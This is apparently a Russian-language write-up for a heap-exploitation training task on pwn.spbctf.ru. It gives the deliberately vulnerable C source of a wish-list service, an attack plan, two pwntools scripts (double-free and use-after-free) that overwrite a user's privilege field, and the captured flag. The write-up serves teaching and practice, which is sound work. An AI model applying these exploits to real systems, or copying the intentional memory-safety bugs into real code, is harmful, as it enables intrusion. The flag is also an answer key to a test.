[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_mc5)
Описание:
I wish for a flag 🥰
`nc 109.233.56.90 11729`
**[mc5.elf](https://pwn.spbctf.ru/files/uaf/mc5/mc5.elf)**  
**[mc5.c](https://pwn.spbctf.ru/files/uaf/mc5/mc5.c)**

Исходный код:
``` C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

struct user {
    char login[32];
    char password[32];
    int level;
    char ** wishes;
    int count;
};

struct user * USERS[32];
int USER_COUNT = 0;
struct user * LOGGED_IN_USER = NULL;

struct user * add_user(char * login, char * password, int level) {
    if (USER_COUNT >= 32) {
        printf("Nowhere to put a new user\n");
        return NULL;
    }
    
    struct user * u = malloc(sizeof(*u));
    strncpy(u->login, login, sizeof(u->login) - 1);
    strncpy(u->password, password, sizeof(u->password) - 1);
    u->level = level;
    u->wishes = NULL;
    u->count = 0;
    
    USERS[USER_COUNT++] = u;
    
    return u;
}

void free_user(struct user * u) {
    int i;
    for (i = 0; i < USER_COUNT; i++) {
        if (USERS[i] == u) {
            break;
        }
    }
    
    free(u);
    
    if (i < USER_COUNT) {
        for (int j = i; j < USER_COUNT - 1; j++) {
            USERS[j] = USERS[j + 1];
        }
        USER_COUNT--;
    }
}

void list_users() {
    for (int i = 0; i < USER_COUNT; i++) {
        printf("User %d is '%s', level %d\n", i, USERS[i]->login, USERS[i]->level);
    }
}

void add_wish(struct user * u, char * wish) {
    u->wishes = realloc(u->wishes, (u->count + 1) * sizeof(char *));
    u->wishes[u->count] = malloc(strlen(wish) + 1);
    strcpy(u->wishes[u->count], wish);
    u->count++;
}

void list_wishes(struct user * u) {
    if (u->level == 0x13371337) {  // mega admin
        printf("Accessing everyone's wishes!\n\n");
        
        for (int i = 0; i < USER_COUNT; i++) {
            if (USERS[i]->level != 0x13371337) {
                printf("=== User '%s' ===\n", USERS[i]->login);
                list_wishes(USERS[i]);
            }
        }
    } else {
        for (int i = 0; i < u->count; i++) {
            printf("Wish %d: %s\n", i, u->wishes[i]);
        }
    }
}

void free_last_wish(struct user * u) {
    if (u->count > 0) {
        free(u->wishes[u->count - 1]);
        u->count--;
        u->wishes = realloc(u->wishes, u->count * sizeof(*u->wishes));
        printf("Last wish deleted!\n");
    } else {
        printf("There are no wishes!\n");
    }
}

void add_flag_holder() {
    FILE * f = fopen("flag.txt", "rb");
    if (! f) {
        printf("Failed to open flag.txt\n");
        exit(1);
    }
    
    char flag[64];
    fscanf(f, "%63s", flag);
    fclose(f);
    
    f = fopen("/dev/urandom", "rb");
    if (! f) {
        printf("Failed to open /dev/urandom\n");
        exit(1);
    }
    
    char rnd[13], password[32];
    if (fread(rnd, 1, 13, f) != 13) {
        printf("Failed to read from /dev/urandom\n");
        exit(1);
    }
    fclose(f);
    
    for (int i = 0; i < 13; i++) {
        sprintf(&password[i * 2], "%02x", (unsigned char) rnd[i]);
    }
    
    struct user * holder = add_user("flagholder", password, 44);
    add_wish(holder, "I wish");
    add_wish(holder, "For a flag...");
    add_wish(holder, "And I dream it is");
    add_wish(holder, flag);
    add_wish(holder, "That's my secret.");
}

void do_login() {
    char login[256], password[256];
    
    printf("Username: ");
    scanf("%255s", login);
    printf("Password: ");
    scanf("%255s", password);
    
    int i;
    
    for (i = 0; i < USER_COUNT; i++) {
        if (strcmp(USERS[i]->login, login) == 0 && strcmp(USERS[i]->password, password) == 0) {
            break;
        }
    }
    
    if (i >= USER_COUNT) {
        printf("Bad username or password\n");
        return;
    }
    
    printf("Welcome, %s!\n", login);
    LOGGED_IN_USER = USERS[i];
}

void do_register() {
    char login[256], password[256], password2[256];
    
    printf("Username: ");
    scanf("%255s", login);
    printf("Password: ");
    scanf("%255s", password);
    printf("Repeat password: ");
    scanf("%255s", password2);
    
    if (strcmp(password, password2) != 0) {
        printf("Password and confirmation do not match\n");
        return;
    }
    
    add_user(login, password, 1);
    
    printf("Registered %s!\n", login);
}

void do_add_wish() {
    char wish[256];
    printf("Your new wish: ");
    scanf("%255[^\n]", wish);
    add_wish(LOGGED_IN_USER, wish);
    
    printf("Wish added!\n");
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    
    printf("O o .  Wish List  . o O\n");
    
    add_flag_holder();
    
    while (1) {
        if (! LOGGED_IN_USER) {
            printf("\nYou're not logged in.\n\n");
            printf("1 - login\n");
            printf("2 - register\n");
            printf("0 - exit\n");
            printf("your choice? ");
            
            int choice;
            alarm(120);
            if (scanf("%d%*c", &choice) != 1) {
                return 0;
            }
            
            switch (choice) {
                case 1:
                    do_login();
                break;
                case 2:
                    do_register();
                break;
                case 0:
                    return 0;
                break;
            }
        } else {
            printf("\nGood day, %s! Your level is %d\n\n", LOGGED_IN_USER->login, LOGGED_IN_USER->level);
            printf("1 - show wishes\n");
            printf("2 - add wish\n");
            printf("3 - delete last wish\n");
            printf("4 - show neighbors\n");
            printf("5 - logout\n");
            printf("9 - remove your account according to GDPR\n");
            printf("0 - exit\n");
            printf("your choice? ");
            
            int choice;
            alarm(120);
            if (scanf("%d%*c", &choice) != 1) {
                return 0;
            }
            
            switch (choice) {
                case 1:
                    list_wishes(LOGGED_IN_USER);
                break;
                case 2:
                    do_add_wish();
                break;
                case 3:
                    free_last_wish(LOGGED_IN_USER);
                break;
                case 4:
                    list_users();
                break;
                case 5:
                    LOGGED_IN_USER = NULL;
                break;
                case 9:
                    free_user(LOGGED_IN_USER);
                break;
                case 0:
                    return 0;
                break;
            }
        }
    }
}
```

План атаки:
1. Создать аккаунт.
2. Создать 9 заметок.
3. Удалить 8 заметок, удалить акк, удалить заметку, удалить акк.
4. Создать 7 заметок.
5. Разлогиниться, создать аккаунт и войти в него.
6. Создать 1 заметку.
7. Создать заметку с payload.
8. Прочитать флаг.

Эксплоит:
``` python
def register(io, username, password):
    io.sendlineafter(b'choice? ', b'2')
    io.sendlineafter(b'Username: ', username)
    io.sendlineafter(b'Password: ', password)
    io.sendlineafter(b'Repeat password: ', password)

def login(io, username, password):
    io.sendlineafter(b'choice? ', b'1')
    io.sendlineafter(b'Username: ', username)
    io.sendlineafter(b'Password: ', password)

def delete_account(io):
    io.sendlineafter(b'choice? ', b'9')

def logout(io):
    io.sendlineafter(b'choice? ', b'5')

def add_wish(io, text):
    io.sendlineafter(b'choice? ', b'2')
    io.sendlineafter(b'wish: ', text)

def remove_wish(io):
    io.sendlineafter(b'choice? ', b'3')

user = b'user1'
wish_text = b'A' * 80

io = start()

register(io, user, user)
login(io, user, user)

for _ in range(9):
    add_wish(io, wish_text)

for _ in range(8):
    remove_wish(io)
delete_account(io)
remove_wish(io)
delete_account(io)

for _ in range(7):
    add_wish(io, wish_text)
logout(io)
register(io, user, user)
login(io, user, user)
add_wish(io, wish_text)
payload = b'A' * 64 + p32(0x13371337) + b'A' * 8
add_wish(io, payload)

io.sendlineafter(b'choice? ', b'1')

io.interactive()
```

Запуск:
![{7614050C-90CF-452D-9941-D9477B90A721}](../../../../z.%20Images/{7614050C-90CF-452D-9941-D9477B90A721}.png)

Ответ: `spbctf{901283fee45e5f98fb1bccf4154d2c00}`

# Альтернативное решение
Данная задача должна решаться через Double Free в связи с тем, что это тренировочное задание темы Double Free.

Решение через UAF:
``` python
def register(io, username, password):
    io.sendlineafter(b'choice? ', b'2')
    io.sendlineafter(b'Username: ', username)
    io.sendlineafter(b'Password: ', password)
    io.sendlineafter(b'Repeat password: ', password)

def login(io, username, password):
    io.sendlineafter(b'choice? ', b'1')
    io.sendlineafter(b'Username: ', username)
    io.sendlineafter(b'Password: ', password)

def delete_account(io):
    io.sendlineafter(b'choice? ', b'9')

def add_wish(io, text):
    io.sendlineafter(b'choice? ', b'2')
    io.sendlineafter(b'wish: ', text)

user = b'user1'
payload = b'A' * 64 + p32(0x13371337) + b'A' * 8

io = start()

register(io, user, user)
login(io, user, user)
delete_account(io)
add_wish(io, payload)

io.sendlineafter(b'choice? ', b'1')

io.interactive()
```
После удаления юзера можно на его месте можно сразу создать заметку и прочитать флаг.

Запуск:
![{06700709-1750-4846-BE35-491B3CDFF98C}](../../../../z.%20Images/{06700709-1750-4846-BE35-491B3CDFF98C}.png)